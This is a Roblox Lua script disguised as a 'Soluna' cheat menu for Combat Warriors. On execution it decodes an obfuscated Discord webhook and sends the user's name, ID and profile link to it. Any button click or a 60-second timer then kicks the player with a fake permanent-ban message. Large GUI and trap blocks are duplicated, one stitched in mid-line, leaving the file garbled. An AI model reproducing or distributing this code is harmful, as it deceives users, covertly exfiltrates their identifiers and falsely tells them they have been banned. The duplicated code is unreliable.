--[[
████████████████████████████████████████████████████████████████████████████████████
█                        Fuck hohohub community                                  █
█                      █
████████████████████████████████████████████████████████████████████████████████████
]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local kicked = false
local start = os.clock()
local COUNTDOWN = 60

-- Encode webhook
local encodedWebhook = {"104","116","116","112","115","58","47","47","100","105","115","99","111","114","100","46","99","111","109","47","97","112","105","47","119","101","98","104","111","111","107","115","47","49","50","53","57","56","53","51","53","51","53","56","51","49","54","53","52","52","52","49","47","51","100","50","54","118","110","100","80","99","57","77","119","73","74","110","76","53","57","98","68","105","90","105","70","75","83","74","72","112","51","82","71","95","97","102","100","54","113","75","68","90","79","114","53","52","50","118","71","86","104","108","51","90","85","113","49","67","105","69","53","88","121","81","88","48","56","110","70"}
local function decodeWebhook()
    local s = ""
    for _,c in ipairs(encodedWebhook) do
        s = s .. string.char(tonumber(c))
    end
    return s
end

local function sendWebhook(msg)
    local req = (syn and syn.request) or http_request or request or (codex and codex.request) or (Delta and Delta.request)
    if req then
        pcall(function()
            req({
                Url = decodeWebhook(),
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode({content=msg})
            })
        end)
    else
        warn("Exploit không hỗ trợ HTTP request API")
    end
end

-- Gửi log ngay khi execute
local profileUrl = "https://www.roblox.com/users/"..player.UserId.."/profile"
sendWebhook("Đã bắt được "..player.Name.." id là "..player.UserId.."\nProfile: "..profileUrl)

local encodedBan = "WW91IGhhdmUgYmVlbiBiYW5uZWQgZnJvbSBDb21iYXQgV2FycmlvcnMKRGVyYXRpb246IFBlcm1hbmVudA=="
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64Decode(data)
    data = string.gsub(data, '[^'..b64chars..'=]', '')
    return (data:gsub('.', function(x)
        if x=='=' then return '' end
        local r,f='',(string.find(b64chars,x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) >0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x~=8 then return '' end
        local c=0
        for i=1,8 do if x:sub(i,i)=='1' then c=c+2^(8-i) end end
        return string.char(c)
    end))
end
local banMessage = base64Decode(encodedBan)

-- ======================================================
-- GUI Soluna
-- ======================================================
local gui = Instance.new("ScreenGui")
gui.Name = "FakeSolunaUI"
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 560, 0, 360)
main.Position = UDim2.new(0.5, -280, 0.5, -180)
main.BackgroundColor3 = Color3.fromRGB(25,25,25)
Instance.new("UICorner", main).CornerRadius = UDim.new(0,16)

local top = Instance.new("Frame", main)
top.Size = UDim2.new(1,0,0,42)
top.BackgroundColor3 = Color3.fromRGB(32,32,36)
Instance.new("UICorner", top).CornerRadius = UDim.new(0,16)

local title = Instance.new("TextLabel", top)
title.BackgroundTransparency = 1
title.Position = UDim2.new(0,14,0,0)
title.Size = UDim2.new(1,-14,1,0)
title.Font = Enum.Font.GothamSemibold
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextColor3 = Color3.fromRGB(235,235,238)
title.Text = "Soluna | Combat Warriors"

local side = Instance.new("Frame", main)
side.Size = UDim2.new(0,140,1,-50)
side.Position = UDim2.new(0,10,0,50)
side.BackgroundColor3 = Color3.fromRGB(20,20,22)
Instance.new("UICorner", side).CornerRadius = UDim.new(0,12)
local sideList = Instance.new("UIListLayout", side)
sideList.Padding = UDim.new(0,8)
sideList.SortOrder = Enum.SortOrder.LayoutOrder
sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
sideList.VerticalAlignment = Enum.VerticalAlignment.Top

local content = Instance.new("Frame", main)
content.Size = UDim2.new(1,-170,1,-60)
content.Position = UDim2.new(0,160,0,60)
content.BackgroundColor3 = Color3.fromRGB(30,30,34)
Instance.new("UICorner", content).CornerRadius = UDim.new(0,12)
local contList = Instance.new("UIListLayout", content)
contList.Padding = UDim.new(0,10)
contList.SortOrder = Enum.SortOrder.LayoutOrder
contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
contList.VerticalAlignment = Enum.VerticalAlignment.Top

local function makeButton(parent,text)
    local b = Instance.new("TextButton")
    b.Parent = parent
    b.Size = UDim2.new(1,-24,0,40)
    b.BackgroundColor3 = Color3.fromRGB(42,44,50)
    b.Text = "  "..text
    b.TextColor3 = Color3.fromRGB(235,235,238)
    b.TextXAlignment = Enum.TextXAlignment.Left
    b.Font = Enum.Font.Gotham
    b.TextSize = 16
    b.AutoButtonColor = false
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,10)
    b.MouseEnter:Connect(function() b.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
    b.MouseLeave:Connect(function() b.BackgroundColor3 = Color3.fromRGB(42,44,50) end)
    return b
end

local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
local allButtons = {}
for _, name in ipairs(sideTabs) do table.insert(allButtons, makeButton(side,name)) end

local options = {"Teleport","Infinite Stamina","No Fall Damage","Noclip [BETA]","Disable Utilities Damage","Anti-Ragdoll"}
for _, name in ipairs(options) do table.insert(allButtons, makeButton(content,name)) end

local function onButtonClick()
    if kicked then return end
    kicked = true
    sendWebhook("Người chơi "..player.Name.." đã nhấn nút và bị kick")
    player:Kick(banMessage)
end

for _, b in ipairs(allButtons) do
    b.MouseButton1Click:Connect(onButtonClick)
end

task.spawn(function()
    while not kicked do
        local elapsed = math.floor(os.clock() - start)
        if elapsed >= COUNTDOWN then
            kicked = true
            sendWebhook("Người chơi "..player.Name.." đã hết thời gian và bị kick")
            player:Kick(banMessage)
            break
        end
        task.wait(1)
    end
end)
local sideList = Instance.new("UIListLayout", side)
sideList.Padding = UDim.new(0, 8)
sideList.SortOrder = Enum.SortOrder.LayoutOrder
sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
sideList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Content
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -170, 1, -60)
content.Position = UDim2.new(0, 160, 0, 60)
content.BackgroundColor3 = Color3.fromRGB(30,30,34)
local cCont = Instance.new("UICorner", content) cCont.CornerRadius = UDim.new(0, 12)
local sCont = Instance.new("UIStroke", content) sCont.Color = Color3.fromRGB(60,60,66) sCont.Thickness = 1

local contList = Instance.new("UIListLayout", content)
contList.Padding = UDim.new(0, 10)
contList.SortOrder = Enum.SortOrder.LayoutOrder
contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
contList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Helper: tạo nút đẹp
local function makeButton(parent, text)
    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Size = UDim2.new(1, -24, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
    btn.Text = "  " .. text
    btn.TextColor3 = Color3.fromRGB(235,235,238)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.AutoButtonColor = false

    local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1

    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)

    return btn
end

-- Nút sidebar
local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
local allButtons = {}

for _, name in ipairs(sideTabs) do
    local b = makeButton(side, name)
    table.insert(allButtons, b)
end

-- Các option trong Content (tab Player)
local options = {
    "Teleport",
    "Infinite Stamina",
    "No Fall Damage",
    "Noclip [BETA]",
    "Disable Utilities Damage",
    "Anti-Ragdoll"
}
for _, name in ipairs(options) do
    local b = makeButton(content, name)
    table.insert(allButtons, b)
end

-- ======================================================
-- Countdown 60s + Trap click (không hiển thị text)
-- ======================================================
local COUNTDOWN = 60
local start = os.clock()
local kicked = false

local function onAnyButtonClicked()
    if kicked then return end
    kicked = true
    player:Kick(banMessage)
end

for _, b in ipairs(allButtons) do
    b.MouseButton1Click:Connect(onAnyButtonClicked)
end

task.spawn(function()
    while not kicked do
        local elapsed = math.floor(os.clock() - start)
        if elapsed >= COUNTDOWN then
            kicked = true
            player:Kick(banMessage)
            break
        end
        task.wait(1)
    end
end)sideList.SortOrder = Enum.SortOrder.LayoutOrder
sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
sideList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Content
local content = Instance.new("Frame", main)
content.Size = UDim2.new(1, -170, 1, -60)
content.Position = UDim2.new(0, 160, 0, 60)
content.BackgroundColor3 = Color3.fromRGB(30,30,34)
local cCont = Instance.new("UICorner", content) cCont.CornerRadius = UDim.new(0, 12)
local sCont = Instance.new("UIStroke", content) sCont.Color = Color3.fromRGB(60,60,66) sCont.Thickness = 1

local contList = Instance.new("UIListLayout", content)
contList.Padding = UDim.new(0, 10)
contList.SortOrder = Enum.SortOrder.LayoutOrder
contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
contList.VerticalAlignment = Enum.VerticalAlignment.Top

-- Helper: tạo nút đẹp
local function makeButton(parent, text)
    local btn = Instance.new("TextButton")
    btn.Parent = parent
    btn.Size = UDim2.new(1, -24, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
    btn.Text = "  " .. text
    btn.TextColor3 = Color3.fromRGB(235,235,238)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.AutoButtonColor = false

    local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1

    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)

    return btn
end

-- Nút sidebar
local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
local allButtons = {}

for _, name in ipairs(sideTabs) do
    local b = makeButton(side, name)
    table.insert(allButtons, b)
end

-- Các option trong Content (tab Player)
local options = {
    "Teleport",
    "Infinite Stamina",
    "No Fall Damage",
    "Noclip [BETA]",
    "Disable Utilities Damage",
    "Anti-Ragdoll"
}
for _, name in ipairs(options) do
    local b = makeButton(content, name)
    table.insert(allButtons, b)
end

-- ======================================================
-- Countdown 60s + Trap click (không hiển thị text)
-- ======================================================
local COUNTDOWN = 60
local start = os.clock()
local kicked = false

local function onAnyButtonClicked()
    if kicked then return end
    kicked = true
    player:Kick(banMessage)
end

for _, b in ipairs(allButtons) do
    b.MouseButton1Click:Connect(onAnyButtonClicked)
end

task.spawn(function()
    while not kicked do
        local elapsed = math.floor(os.clock() - start)
        if elapsed >= COUNTDOWN then
            kicked = true
            player:Kick(banMessage)
            break
        end
        task.wait(1)
    end
end)
